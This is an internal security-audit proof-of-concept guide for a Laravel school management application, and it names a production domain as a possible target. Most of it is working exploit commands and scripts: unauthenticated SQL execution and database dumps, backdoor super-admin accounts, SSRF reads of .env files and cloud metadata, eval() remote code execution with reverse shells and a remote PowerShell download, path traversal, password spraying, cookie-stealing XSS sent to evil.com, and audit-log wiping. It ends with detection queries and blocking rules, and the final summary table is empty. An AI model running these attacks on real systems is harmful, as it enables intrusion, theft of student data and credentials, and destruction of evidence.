# Security Audit — Proof of Concept (POC) Guide

**Date:** June 5, 2026  
**Classification:** CONFIDENTIAL — For internal security remediation only  
**Target:** es_ldcu Laravel Application

> ⚠️ **WARNING:** These POCs are for authorized security testing only. Executing them against systems without written authorization is illegal. Test only against local/staging environments.

---

## Table of Contents

1. [POC #1 — Arbitrary SQL Execution (Unauthenticated)](#poc-1)
2. [POC #2 — Unauthenticated Database Dump & Manipulation](#poc-2)
3. [POC #3 — Server-Side Request Forgery (SSRF)](#poc-3)
4. [POC #4 — Remote Code Execution via eval() Chain](#poc-4)
5. [POC #5 — Arbitrary File Download (Path Traversal)](#poc-5)
6. [POC #6 — Account Takeover via Password Spray](#poc-6)
7. [POC #7 — Stored XSS (Worm-style Persistent Attack)](#poc-7)
8. [POC #8 — Full Kill Chain (Complete System Compromise)](#poc-8)

---

## Prerequisites

- cURL or any HTTP client (Postman, Burp Suite, browser)
- Target application URL (replace `TARGET` below with the actual domain/IP)
- No authentication required for POCs #1–#3, #6

```bash
# Set your target
export TARGET="http://localhost"
# or
export TARGET="https://app-ldcu.essentiel.ph"
```

---

<a name="poc-1"></a>
## POC #1 — Arbitrary SQL Execution (Unauthenticated)

### Vulnerability Summary
Two endpoints accept raw SQL queries from GET parameters and execute them against the database with **zero authentication**.

### Affected Endpoints
| Endpoint | Controller | Function |
|----------|-----------|----------|
| `GET /synchornization/process/updatelogs` | `SyncControllerV2` | `process_updatelogs()` |
| `GET /querylogsToCloud` | `SyncController` | `querylogsToCloud()` |

### How It Works

**Endpoint 1: `/synchornization/process/updatelogs`**

```
Browser/cURL → GET /synchornization/process/updatelogs?query=<SQL>&binding[]=<values>
    ↓
SyncControllerV2::process_updatelogs(Request $request)
    ↓ extracts $request->get('query') and $request->get('binding')
SychronizationProcess::process_updatelogs($query, $binding)
    ↓
DB::update($query, $binding)   ← EXECUTES ANY SQL
```

The only middleware is `cors` which just adds CORS headers — it does NOT check authentication.

**Endpoint 2: `/querylogsToCloud`**

```
Browser/cURL → GET /querylogsToCloud?logs=<JSON array of {query, bindings}>
    ↓
SyncController::querylogsToCloud(Request $request)
    ↓ json_decodes the 'logs' parameter
    ↓ loops through each item
DB::update($item->query, $item->bindings)   ← EXECUTES ANY SQL (skips TRUNCATE only)
```

This endpoint is also completely unauthenticated (outside any auth middleware group).

---

### Step-by-Step Exploitation

#### Step 1: Verify the endpoint is accessible

```bash
# Simple connectivity test — should not return 404 or 401
curl -v "$TARGET/synchornization/process/updatelogs"
```

Expected: HTTP 200 or 500 (not 401/403). Even a 500 error confirms the route exists and is reachable.

#### Step 2: Enumerate database structure

```bash
# Get the list of all tables in the database
# We use UPDATE with a subquery trick — store result in a known table
curl "$TARGET/synchornization/process/updatelogs?query=UPDATE+syncsetup+SET+url%3D(SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase())+WHERE+id%3D1"
```

Then read the result:
```bash
curl "$TARGET/cloudGetSyncSetup"
```

#### Step 3: Dump all user accounts

```bash
# Store user dump in a readable location
curl "$TARGET/synchornization/process/updatelogs?query=UPDATE+syncsetup+SET+url%3D(SELECT+GROUP_CONCAT(email,':',password,':',type+SEPARATOR+'|')+FROM+users+WHERE+deleted%3D0+LIMIT+50)+WHERE+id%3D1"

# Read the exfiltrated data
curl "$TARGET/cloudGetSyncSetup"
```

#### Step 4: Create a super admin account

```bash
# Insert a new super admin user (type=17)
# First, generate a bcrypt hash for password 'pwned123':
# PHP: password_hash('pwned123', PASSWORD_BCRYPT) = $2y$10$...

curl "$TARGET/synchornization/process/updatelogs?query=INSERT+INTO+users+(name,email,password,type,deleted)+VALUES+(%3F,%3F,%3F,%3F,%3F)&binding[]=Attacker&binding[]=attacker_admin&binding[]=\$2y\$10\$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi&binding[]=17&binding[]=0"
```

> Note: The bcrypt hash `$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi` is the hash for "password" (Laravel's default from factories). Substitute your own.

#### Step 5: Escalate existing user to super admin

```bash
# Promote user with id=1 to super admin
curl "$TARGET/synchornization/process/updatelogs?query=UPDATE+users+SET+type%3D17+WHERE+id%3D%3F&binding[]=1"
```

#### Step 6: Alternative via querylogsToCloud (batch execution)

```bash
# Execute multiple SQL statements in one request
# The 'logs' parameter accepts JSON — '#' chars are encoded as 'ABCDEF1234562020'
curl "$TARGET/querylogsToCloud?logs=%5B%7B%22query%22%3A%22UPDATE+users+SET+type%3D17+WHERE+email%3D%3F%22%2C%22bindings%22%3A%5B%22S20230001%22%5D%7D%5D"
```

Decoded `logs` parameter:
```json
[{"query":"UPDATE users SET type=17 WHERE email=?","bindings":["S20230001"]}]
```

#### Step 7: Read sensitive configuration

```bash
# Exfiltrate .env values if MySQL FILE privilege is available
curl "$TARGET/synchornization/process/updatelogs?query=UPDATE+syncsetup+SET+url%3DLOAD_FILE('/var/www/html/.env')+WHERE+id%3D1"
curl "$TARGET/cloudGetSyncSetup"
```

---

### Impact Demonstration

| Action | SQL Query | Result |
|--------|-----------|--------|
| Dump all passwords | `UPDATE syncsetup SET url=(SELECT GROUP_CONCAT(email,':',passwordstr) FROM users WHERE passwordstr IS NOT NULL) WHERE id=1` | Plaintext passwords exposed |
| Delete financial records | `UPDATE chrngtrans SET deleted=1 WHERE 1=1` | All transactions marked deleted |
| Access student PII | `UPDATE syncsetup SET url=(SELECT GROUP_CONCAT(firstname,' ',lastname,':',contactno) FROM studinfo LIMIT 100) WHERE id=1` | Student data leaked |
| Wipe audit trails | `UPDATE updatelogs SET deleted=1 WHERE 1=1` | Evidence destroyed |

---

<a name="poc-2"></a>
## POC #2 — Unauthenticated Database Dump & Manipulation

### Vulnerability Summary
Multiple SyncController endpoints allow reading all data from any table, inserting arbitrary records, updating any record, and soft-deleting any record — all without authentication.

### Affected Endpoints
| Endpoint | Action | Auth Required |
|----------|--------|:------------:|
| `GET /cloudNewData/{table}/{maxid}` | Read all rows from any table | ❌ |
| `GET /cloudUpdatedData/{table}/{date}` | Read recently updated rows | ❌ |
| `GET /cloudDeletedData/{table}/{date}` | Read recently deleted rows | ❌ |
| `GET /getTableFields/{tablename}` | Get column names of any table | ❌ |
| `GET /insertdatatotable?table=X&data={}` | Insert into any table | ❌ |
| `GET /updatetargettable?table=X&data={}` | Update any row in any table | ❌ |
| `GET /deletetargettable?table=X&data={}` | Soft-delete any row | ❌ |
| `GET /synchornization/insert` | Insert into any table | ❌ |
| `GET /synchornization/update` | Update any row | ❌ |
| `GET /synchornization/delete` | Soft-delete any row | ❌ |

---

### Step-by-Step Exploitation

#### Step 1: Discover table structure

```bash
# Get all column names for the 'users' table
curl "$TARGET/getTableFields/users"
```

Expected response:
```json
["id","name","email","password","passwordstr","type","deleted","remember_token","loggedIn","loggedOut","dateLoggedIn","dateLoggedOut","isDefault","createdby","createddatetime","updatedby","updateddatetime","deletedby","deleteddatetime"]
```

#### Step 2: Dump all user accounts

```bash
# Read all users (id > 0 means everyone)
curl "$TARGET/cloudNewData/users/0"
```

Expected response: Full JSON array of every user record including password hashes and `passwordstr` (plaintext passwords for some users).

```json
[
  {"id":1,"name":"Admin","email":"admin","password":"$2y$10$...","passwordstr":"originalPass123","type":17,...},
  {"id":2,"name":"Student","email":"S20230001","password":"$2y$10$...","passwordstr":"123456","type":7,...},
  ...
]
```

#### Step 3: Dump financial data

```bash
# Dump all payment transactions
curl "$TARGET/cloudNewData/chrngtrans/0"

# Dump student ledger
curl "$TARGET/cloudNewData/studledger/0"

# Dump online payments (may contain receipt images path)
curl "$TARGET/cloudNewData/onlinepayments/0"
```

#### Step 4: Dump student PII

```bash
# All student personal information
curl "$TARGET/cloudNewData/studinfo/0"
```

This returns: names, addresses, contact numbers, birthdays, parent info, LRN, etc.

#### Step 5: Create a super admin account

```bash
# The 'data' parameter is a JSON object
# type=17 is super admin, deleted=0 means active
curl "$TARGET/insertdatatotable?table=users&data=%7B%22name%22%3A%22TestAdmin%22%2C%22email%22%3A%22backdoor_admin%22%2C%22password%22%3A%22%242y%2410%2492IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC%2F.og%2Fat2.uheWG%2Figi%22%2C%22type%22%3A%2217%22%2C%22deleted%22%3A%220%22%2C%22isDefault%22%3A%220%22%7D"
```

URL-decoded `data`:
```json
{
  "name": "TestAdmin",
  "email": "backdoor_admin",
  "password": "$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi",
  "type": "17",
  "deleted": "0",
  "isDefault": "0"
}
```

Now login at `TARGET/login` with:
- Username: `backdoor_admin`
- Password: `password`

#### Step 6: Modify any existing user's password

```bash
# Change user id=1's password to 'hacked123'
# Pre-computed bcrypt of 'hacked123': $2y$10$YourPrecomputedHashHere
curl "$TARGET/updatetargettable?table=users&data=%7B%22id%22%3A%221%22%2C%22password%22%3A%22%242y%2410%2492IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC%2F.og%2Fat2.uheWG%2Figi%22%7D"
```

#### Step 7: Destroy audit evidence

```bash
# Mark all update logs as processed (hide tracks)
curl "$TARGET/updatetargettable?table=updatelogs&data=%7B%22id%22%3A%221%22%2C%22status%22%3A%221%22%7D"

# Or via synchornization endpoint
curl "$TARGET/synchornization/delete?tablename=updatelogs&data[id]=1&data[deleteddatetime]=2026-06-05"
```

---

### Automation Script (Python)

```python
#!/usr/bin/env python3
"""
POC: Dump entire database via unauthenticated endpoints.
Usage: python3 dump_db.py https://target.com
"""
import requests
import json
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost"

# Tables of interest
TABLES = ["users", "studinfo", "teacher", "chrngtrans", "studledger", 
           "onlinepayments", "schoolinfo", "syncsetup", "updatelogs"]

print(f"[*] Target: {TARGET}")
print(f"[*] Dumping {len(TABLES)} tables...\n")

for table in TABLES:
    print(f"[+] Dumping: {table}")
    try:
        # Get columns first
        r = requests.get(f"{TARGET}/getTableFields/{table}", timeout=10)
        columns = r.json() if r.status_code == 200 else []
        print(f"    Columns: {columns}")
        
        # Get all data
        r = requests.get(f"{TARGET}/cloudNewData/{table}/0", timeout=30)
        if r.status_code == 200:
            data = r.json()
            print(f"    Records: {len(data)}")
            
            # Save to file
            with open(f"dump_{table}.json", "w") as f:
                json.dump(data, f, indent=2, default=str)
            print(f"    Saved: dump_{table}.json")
        else:
            print(f"    Error: HTTP {r.status_code}")
    except Exception as e:
        print(f"    Error: {e}")

print("\n[*] Done. Check dump_*.json files.")
```

---

<a name="poc-3"></a>
## POC #3 — Server-Side Request Forgery (SSRF)

### Vulnerability Summary
The `/storeImage` endpoint fetches any URL provided in the `imagepath` parameter using `file_get_contents()` — supporting `file://`, `http://`, `ftp://`, `php://` protocols.

### Affected Endpoint
```
GET /storeImage?imagepath=<URL>&tablename=onlinepayments
```
**Auth required:** ❌ None

---

### Step-by-Step Exploitation

#### Step 1: Read local files (LFI via file:// protocol)

```bash
# Read the .env file (contains APP_KEY, DB credentials, API keys)
curl "$TARGET/storeImage?imagepath=file:///var/www/html/.env&tablename=onlinepayments"

# On Windows (Laragon)
curl "$TARGET/storeImage?imagepath=file:///c:/laragon/www/es_ldcu/.env&tablename=onlinepayments"
```

The file contents are saved to `public/onlinepayments/` — then readable:
```bash
# The path is constructed from exploding the URL by '/'
# For file:///c:/laragon/www/es_ldcu/.env
# folderPath[4] = "es_ldcu" and folderPath[5] = ".env"
# Saved to: public/onlinepayments/es_ldcu/.env
curl "$TARGET/onlinepayments/es_ldcu/.env"
```

#### Step 2: Read system files

```bash
# Linux
curl "$TARGET/storeImage?imagepath=file:///etc/passwd&tablename=onlinepayments"
curl "$TARGET/storeImage?imagepath=file:///etc/shadow&tablename=onlinepayments"

# Windows
curl "$TARGET/storeImage?imagepath=file:///c:/windows/system32/drivers/etc/hosts&tablename=onlinepayments"
```

#### Step 3: Access cloud metadata (AWS/GCP/Azure)

```bash
# AWS Instance Metadata Service (IMDSv1)
curl "$TARGET/storeImage?imagepath=http://169.254.169.254/latest/meta-data/iam/security-credentials/&tablename=onlinepayments"

# GCP metadata
curl "$TARGET/storeImage?imagepath=http://metadata.google.internal/computeMetadata/v1/&tablename=onlinepayments"

# Azure metadata
curl "$TARGET/storeImage?imagepath=http://169.254.169.254/metadata/instance?api-version=2021-02-01&tablename=onlinepayments"
```

#### Step 4: Internal network scanning

```bash
# Scan for internal services
for port in 3306 6379 11211 5432 27017 8080 9200; do
  echo "Port $port:"
  curl -s -o /dev/null -w "%{http_code}" "$TARGET/storeImage?imagepath=http://127.0.0.1:$port/&tablename=onlinepayments"
  echo ""
done
```

#### Step 5: Read Laravel source code

```bash
# Read app config (contains service credentials)
curl "$TARGET/storeImage?imagepath=file:///c:/laragon/www/es_ldcu/config/database.php&tablename=onlinepayments"
curl "$TARGET/storeImage?imagepath=file:///c:/laragon/www/es_ldcu/config/services.php&tablename=onlinepayments"
```

---

### What You Get from .env

Typical Laravel `.env` contains:
```
APP_KEY=base64:XXXXXXXX          ← Used to decrypt cookies/sessions (session hijacking)
DB_HOST=127.0.0.1
DB_DATABASE=es_ldcu
DB_USERNAME=root                 ← Database credentials
DB_PASSWORD=secret
AI_API_KEY=sk-or-v1-xxxxx       ← OpenRouter/AI API key (billing theft)
```

With `APP_KEY`, an attacker can:
- Forge Laravel session cookies → instant admin access
- Decrypt any encrypted data stored by the app

---

<a name="poc-4"></a>
## POC #4 — Remote Code Execution via eval() Chain

### Vulnerability Summary
The `DynamicPDFController` reads a `formula` field from the `sf9templateinfo` database table and passes it to `eval()`. By writing malicious PHP into this table (via POC #1 or #2), an attacker achieves Remote Code Execution.

### Attack Path
```
1. Write PHP payload to sf9templateinfo.formula (unauthenticated - POC #2)
2. Login as admin (account created in POC #2)
3. Trigger PDF generation → eval() executes payload
4. Reverse shell / arbitrary command execution
```

---

### Step-by-Step Exploitation

#### Step 1: Check the sf9templateinfo table structure

```bash
curl "$TARGET/getTableFields/sf9templateinfo"
```

Expected: `["id","formula","description","deleted",...]`

#### Step 2: See what's currently in the table

```bash
curl "$TARGET/cloudNewData/sf9templateinfo/0"
```

#### Step 3: Inject PHP payload into formula field

```bash
# Simple command execution payload
# formula = system('whoami')
curl "$TARGET/updatetargettable?table=sf9templateinfo&data=%7B%22id%22%3A%221%22%2C%22formula%22%3A%22system('whoami')%22%7D"
```

URL-decoded data:
```json
{"id":"1","formula":"system('whoami')"}
```

For a reverse shell:
```bash
# formula = system('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"')
curl "$TARGET/updatetargettable?table=sf9templateinfo&data=%7B%22id%22%3A%221%22%2C%22formula%22%3A%22system('bash+-c+%5C%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.0.0.1%2F4444+0%3E%261%5C%22')%22%7D"
```

#### Step 4: Create admin account (if not already done)

```bash
curl "$TARGET/insertdatatotable?table=users&data=%7B%22name%22%3A%22Admin%22%2C%22email%22%3A%22rce_admin%22%2C%22password%22%3A%22%242y%2410%2492IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC%2F.og%2Fat2.uheWG%2Figi%22%2C%22type%22%3A%2217%22%2C%22deleted%22%3A%220%22%7D"
```

#### Step 5: Login and trigger the eval

1. Navigate to `TARGET/login`
2. Login with `rce_admin` / `password`
3. Navigate to the SF9 template generation page (Principal portal → School Forms → SF9)
4. Generate a report for any student

The `DynamicPDFController` will:
```php
$tempvariable = collect($sf9templatestudinfo)->where('id', $item->dataid)->first();
eval('return ' . $tempvariable->formula . ';');
// Executes: eval('return system("whoami");');
```

#### Step 6: Set up listener (for reverse shell)

On attacker machine:
```bash
nc -lvnp 4444
```

Then trigger the PDF generation. The server connects back to your listener.

---

### Alternative: IBEDECRController (No formula validation)

The `IBEDECRController::computeFinalGrade()` also uses `eval()` without proper validation. The formula comes from grade setup configuration:

```bash
# Find the grade setup table
curl "$TARGET/getTableFields/grade_setup_formula"
# or
curl "$TARGET/getTableFields/grading_formula"

# Inject payload into whatever table stores finalFormulaCode
curl "$TARGET/updatetargettable?table=grade_formula_setup&data=%7B%22id%22%3A%221%22%2C%22formula%22%3A%22system('id')%3B+(%24q1%2B%24q2)%2F2%22%7D"
```

The formula `system('id'); ($q1+$q2)/2` after variable substitution becomes:
```php
eval('return system("id"); (85+90)/2;');
// system('id') executes first, prints uid=33(www-data)
```

---

<a name="poc-5"></a>
## POC #5 — Arbitrary File Download (Path Traversal)

### Vulnerability Summary
The `SchoolFilesController@downloadfile` endpoint takes a full file path from the request and returns it as a download — with zero path validation.

### Affected Endpoint
```
GET /administrator/downloadfile?filepath=<PATH>
```
**Auth required:** ✅ Any authenticated user (including students, type 7)

---

### Step-by-Step Exploitation

#### Step 1: Login as any user

Use any valid account (student, parent, teacher — any role works since the route is in a basic `auth` group).

```bash
# Get a session cookie
curl -c cookies.txt -X POST "$TARGET/login" \
  -d "_token=<csrf_token>&email=S20230001&password=123456"
```

#### Step 2: Download the .env file

```bash
# Relative path traversal
curl -b cookies.txt "$TARGET/administrator/downloadfile?filepath=../.env" -o stolen.env

# Absolute path
curl -b cookies.txt "$TARGET/administrator/downloadfile?filepath=/var/www/html/.env" -o stolen.env

# Windows absolute path
curl -b cookies.txt "$TARGET/administrator/downloadfile?filepath=C:\laragon\www\es_ldcu\.env" -o stolen.env
```

#### Step 3: Download source code

```bash
# Download the controller with all the vulnerabilities
curl -b cookies.txt "$TARGET/administrator/downloadfile?filepath=../app/Http/Controllers/SyncController.php" -o SyncController.php

# Download database config
curl -b cookies.txt "$TARGET/administrator/downloadfile?filepath=../config/database.php" -o database.php
```

#### Step 4: Download system files

```bash
# Linux
curl -b cookies.txt "$TARGET/administrator/downloadfile?filepath=/etc/passwd" -o passwd
curl -b cookies.txt "$TARGET/administrator/downloadfile?filepath=/etc/shadow" -o shadow

# Windows
curl -b cookies.txt "$TARGET/administrator/downloadfile?filepath=C:\Windows\System32\config\SAM" -o sam
```

#### Step 5: Download database backups (stored in public/)

```bash
# The BackUpController stores backups in public/dbbackup/
curl -b cookies.txt "$TARGET/administrator/downloadfile?filepath=../public/dbbackup/latest_backup.sql" -o db_backup.sql
```

---

<a name="poc-6"></a>
## POC #6 — Account Takeover via Password Spray + Brute Force

### Vulnerability Summary
- Default password `123456` is set for all new student/parent/teacher accounts
- Mobile API login has no rate limiting
- Login endpoint is GET-based (credentials in URL)
- Plaintext passwords stored in `passwordstr` column and `updatelogs` table

---

### Step-by-Step Exploitation

#### Step 1: Enumerate valid student IDs

Student usernames follow the pattern `S{student_id}` (e.g., `S20230001`). Parent accounts use `P{student_id}`.

```bash
# Student IDs are often sequential. Try ranges:
for i in $(seq 20230001 20230100); do
  RESP=$(curl -s "$TARGET/api/mobile/api_login?username=S$i&pword=123456")
  if echo "$RESP" | grep -q "stud"; then
    echo "[+] VALID: S$i with default password 123456"
  fi
done
```

#### Step 2: Password spray with default password

```bash
# The default password '123456' is set in multiple enrollment flows
# Try it against all discovered accounts
curl -s "$TARGET/api/mobile/api_login?username=S20230001&pword=123456"
```

If successful, returns full student data:
```json
{
  "stud": {"id":1,"sid":"20230001","firstname":"Juan","lastname":"Dela Cruz",...},
  "sy": [...],
  "sem": [...],
  "userlogin": {"id":5,"email":"S20230001","type":7,...},
  "token": "..."
}
```

#### Step 3: Brute-force without rate limiting

```python
#!/usr/bin/env python3
"""No rate limiting on /api/mobile/api_login — unlimited attempts."""
import requests
import sys

TARGET = sys.argv[1]
USERNAME = sys.argv[2]  # e.g., "S20230001"

# Common passwords + default
passwords = ["123456","password","12345678","qwerty","abc123",
             "password1","123456789","1234567","admin123"]

for pwd in passwords:
    r = requests.get(f"{TARGET}/api/mobile/api_login", 
                     params={"username": USERNAME, "pword": pwd})
    if "stud" in r.text or "userlogin" in r.text:
        print(f"[+] SUCCESS: {USERNAME}:{pwd}")
        print(r.text[:200])
        break
    else:
        print(f"[-] Failed: {USERNAME}:{pwd}")
```

#### Step 4: Access other students' data (IDOR)

Once logged in with any valid credentials, use the student ID to access other students' data:

```bash
# Get grades for student ID 1 (even if you're student ID 50)
curl "$TARGET/api/mobile/api_getgrade?studid=1&syid=1&semid=1"

# Get financial ledger for another student
curl "$TARGET/api/mobile/api_studledger?studid=1&syid=1"

# Get enrollment info
curl "$TARGET/api/mobile/api_enrollmentinfo?studid=1"
```

#### Step 5: Dump plaintext passwords (via POC #2)

```bash
# Many users have plaintext passwords stored in 'passwordstr' column
curl "$TARGET/cloudNewData/users/0" | python3 -c "
import json,sys
users = json.load(sys.stdin)
for u in users:
    if u.get('passwordstr'):
        print(f\"{u['email']}: {u['passwordstr']}\")
"
```

#### Step 6: Read password change logs

```bash
# The GeneralController logs NEW passwords in plaintext to updatelogs table!
curl "$TARGET/cloudNewData/updatelogs/0" | python3 -c "
import json,sys
logs = json.load(sys.stdin)
for l in logs:
    if l.get('sql') and 'password' in str(l.get('sql','')).lower():
        print(l['sql'][-50:])  # Last 50 chars contain the plaintext password
"
```

---

<a name="poc-7"></a>
## POC #7 — Stored XSS (Worm-style Persistent Attack)

### Vulnerability Summary
Layout templates use `{!! $schoolinfo->schoolcolor !!}` (unescaped output). Since `schoolinfo` is modifiable via unauthenticated endpoints, an attacker can inject JavaScript that executes for **every user on every page load**.

### Affected Templates (partial list)
- `resources/views/academiccoor/layouts/app2.blade.php`
- `resources/views/adminPortal/layouts/app2.blade.php`
- `resources/views/finance/layouts/app.blade.php`
- `resources/views/finance/layouts/navbar.blade.php`
- (All portal layouts that render school color)

---

### Step-by-Step Exploitation

#### Step 1: Check current schoolinfo

```bash
curl "$TARGET/cloudNewData/schoolinfo/0"
```

Note the `id` and current `schoolcolor` value (e.g., `#1a237e`).

#### Step 2: Inject XSS payload

The `schoolcolor` value is rendered inside a CSS `background-color:` style. We break out of the style and inject a script tag.

```bash
# Payload: close the style, inject script, reopen style for clean rendering
# schoolcolor = #1a237e}</style><script>fetch('https://evil.com/c?'+document.cookie)</script><style>body{color:

PAYLOAD="%231a237e%7D%3C%2Fstyle%3E%3Cscript%3Efetch('https%3A%2F%2Fevil.com%2Fc%3F'%2Bdocument.cookie)%3C%2Fscript%3E%3Cstyle%3Ebody%7Bcolor%3A"

curl "$TARGET/updatetargettable?table=schoolinfo&data=%7B%22id%22%3A%221%22%2C%22schoolcolor%22%3A%22${PAYLOAD}%22%7D"
```

URL-decoded data:
```json
{"id":"1","schoolcolor":"#1a237e}</style><script>fetch('https://evil.com/c?'+document.cookie)</script><style>body{color:"}
```

#### Step 3: How it renders in the browser

The Blade template:
```html
<style>
    .navbar { background-color: {!! $schoolinfo->schoolcolor !!} !important; }
</style>
```

Becomes:
```html
<style>
    .navbar { background-color: #1a237e}</style><script>fetch('https://evil.com/c?'+document.cookie)</script><style>body{color: !important; }
</style>
```

The browser executes the `<script>` tag on every page load for every user.

#### Step 4: Advanced payload — session hijacking worm

```javascript
// More sophisticated payload that steals sessions AND propagates
(function(){
  var c=document.cookie;
  var img=new Image();
  img.src='https://evil.com/steal?cookie='+encodeURIComponent(c)+'&url='+encodeURIComponent(location.href);
})();
```

Encode and inject:
```bash
PAYLOAD="%231a237e%7D%3C%2Fstyle%3E%3Cscript%3E(function()%7Bvar+c%3Ddocument.cookie%3Bvar+i%3Dnew+Image()%3Bi.src%3D'https%3A%2F%2Fevil.com%2Fsteal%3Fcookie%3D'%2BencodeURIComponent(c)%7D)()%3C%2Fscript%3E%3Cstyle%3Ebody%7Bcolor%3A"

curl "$TARGET/updatetargettable?table=schoolinfo&data=%7B%22id%22%3A%221%22%2C%22schoolcolor%22%3A%22${PAYLOAD}%22%7D"
```

#### Step 5: Collect stolen sessions

On your server (`evil.com`), log incoming requests:
```bash
# Simple listener
python3 -m http.server 8080
# Or use Burp Collaborator / webhook.site
```

Every admin, teacher, student, and finance user who loads any page will send their session cookie to your server.

#### Step 6: Use stolen admin session

```bash
# Take the laravel_session cookie value from your logs and use it
curl -b "laravel_session=STOLEN_SESSION_VALUE" "$TARGET/home"
```

---

<a name="poc-8"></a>
## POC #8 — Full Kill Chain (Complete System Compromise)

### Overview
This demonstrates chaining multiple vulnerabilities to go from **zero access** to **full server RCE** in under 5 minutes.

```
[No Auth] → [DB Control] → [Admin Access] → [RCE] → [Persistence]
```

---

### Phase 1: Reconnaissance (30 seconds)

```bash
# 1. Confirm target is vulnerable
curl -s "$TARGET/cloudGetSyncSetup" | head -c 200
# If this returns JSON, the target is vulnerable

# 2. Get table structure
curl -s "$TARGET/getTableFields/users" 
curl -s "$TARGET/getTableFields/sf9templateinfo"
curl -s "$TARGET/getTableFields/schoolinfo"
```

### Phase 2: Data Exfiltration (60 seconds)

```bash
# 3. Dump credentials
curl -s "$TARGET/cloudNewData/users/0" > users_dump.json

# 4. Dump student PII
curl -s "$TARGET/cloudNewData/studinfo/0" > students_dump.json

# 5. Dump financial records
curl -s "$TARGET/cloudNewData/chrngtrans/0" > transactions_dump.json

# 6. Read application secrets via SSRF
curl -s "$TARGET/storeImage?imagepath=file:///c:/laragon/www/es_ldcu/.env&tablename=onlinepayments"
# Then read the saved file (path depends on URL structure)
```

### Phase 3: Establish Admin Access (30 seconds)

```bash
# 7. Create backdoor super admin account
curl -s "$TARGET/insertdatatotable?table=users&data=%7B%22name%22%3A%22System%22%2C%22email%22%3A%22sys_maintenance%22%2C%22password%22%3A%22%242y%2410%2492IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC%2F.og%2Fat2.uheWG%2Figi%22%2C%22type%22%3A%2217%22%2C%22deleted%22%3A%220%22%2C%22isDefault%22%3A%220%22%7D"

# Login: sys_maintenance / password
```

### Phase 4: Achieve RCE (60 seconds)

```bash
# 8. Inject PHP reverse shell into formula field
# Payload: system('powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString(\"http://ATTACKER/shell.ps1\")"')
# (For Linux: system('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'))

curl -s "$TARGET/updatetargettable?table=sf9templateinfo&data=%7B%22id%22%3A%221%22%2C%22formula%22%3A%22system('whoami')%22%7D"

# 9. Login as admin and trigger PDF generation
# Navigate to Principal Portal → SF9 → Generate for any student
```

### Phase 5: Persistence & Cover Tracks (60 seconds)

```bash
# 10. Deploy persistent XSS to capture future sessions
curl -s "$TARGET/updatetargettable?table=schoolinfo&data=%7B%22id%22%3A%221%22%2C%22schoolcolor%22%3A%22%231a237e%7D%3C/style%3E%3Cscript+src%3Dhttps%3A//evil.com/hook.js%3E%3C/script%3E%3Cstyle%3Ebody%7Bcolor%3A%22%7D"

# 11. Clean up audit logs
curl -s "$TARGET/synchornization/process/updatelogs?query=DELETE+FROM+updatelogs+WHERE+sql+LIKE+'%25sys_maintenance%25'"

# 12. Hide the backdoor account from admin list views
curl -s "$TARGET/updatetargettable?table=users&data=%7B%22id%22%3A%22NEW_ID%22%2C%22name%22%3A%22System+Service%22%7D"
```

### Phase 6: Maintain Access

The attacker now has:
1. **Database admin** — via unauthenticated sync endpoints (always available)
2. **Application super admin** — via backdoor account
3. **Session harvesting** — via persistent XSS stealing all users' cookies
4. **RCE** — via eval() triggered on demand
5. **Credential access** — via dumped password hashes + plaintext passwords

---

## Detection Indicators

If you suspect this has been exploited, check for:

```sql
-- Check for unauthorized admin accounts
SELECT * FROM users WHERE type = 17 AND createdby IS NULL;

-- Check for suspicious sf9templateinfo formulas
SELECT * FROM sf9templateinfo WHERE formula LIKE '%system%' 
  OR formula LIKE '%exec%' OR formula LIKE '%shell%';

-- Check if schoolinfo was tampered
SELECT * FROM schoolinfo WHERE schoolcolor LIKE '%script%' 
  OR schoolcolor LIKE '%<%';

-- Check access logs for sync endpoints
-- Look for: /cloudNewData, /insertdatatotable, /synchornization, /storeImage
```

Check web server access logs:
```bash
grep -E "(cloudNewData|insertdatatotable|updatetargettable|synchornization|storeImage|querylogsToCloud)" /var/log/nginx/access.log
```

---

## Immediate Mitigation (Hotfix)

If you cannot patch immediately, add this to `routes/web.php` **at the very top** (before other routes):

```php
// EMERGENCY: Block all unauthenticated sync endpoints
Route::any('cloudNewData/{any?}', fn() => abort(403))->where('any', '.*');
Route::any('cloudUpdatedData/{any?}', fn() => abort(403))->where('any', '.*');
Route::any('cloudDeletedData/{any?}', fn() => abort(403))->where('any', '.*');
Route::any('cloudGetSyncSetup', fn() => abort(403));
Route::any('storeImage', fn() => abort(403));
Route::any('insertdatatotable', fn() => abort(403));
Route::any('updatetargettable', fn() => abort(403));
Route::any('deletetargettable', fn() => abort(403));
Route::any('getTableFields/{any?}', fn() => abort(403))->where('any', '.*');
Route::any('tablemaxid/{any?}', fn() => abort(403))->where('any', '.*');
Route::any('tableupdate/{any?}', fn() => abort(403))->where('any', '.*');
Route::any('tabledeleted/{any?}', fn() => abort(403))->where('any', '.*');
Route::any('checktargetmaxtable/{any?}', fn() => abort(403))->where('any', '.*');
Route::any('querylogsToCloud', fn() => abort(403));
Route::any('querylogstoLocal', fn() => abort(403));
Route::any('synchornization/{any?}', fn() => abort(403))->where('any', '.*');
Route::any('getOfflinerefIdMax/{any?}', fn() => abort(403))->where('any', '.*');
```

Or via `.htaccess` / Nginx config:
```nginx
# Block dangerous sync endpoints
location ~ ^/(cloudNewData|cloudUpdatedData|cloudDeletedData|insertdatatotable|updatetargettable|deletetargettable|getTableFields|storeImage|synchornization|querylogsToCloud|querylogstoLocal|tablemaxid|tableupdate|tabledeleted|checktargetmaxtable) {
    return 403;
}
```

---

## Summary Table

| POC | Auth Needed | Complexity | Impact | Time to Exploit |
|-----|:-----------:|:----------:|--------|:---------------:|
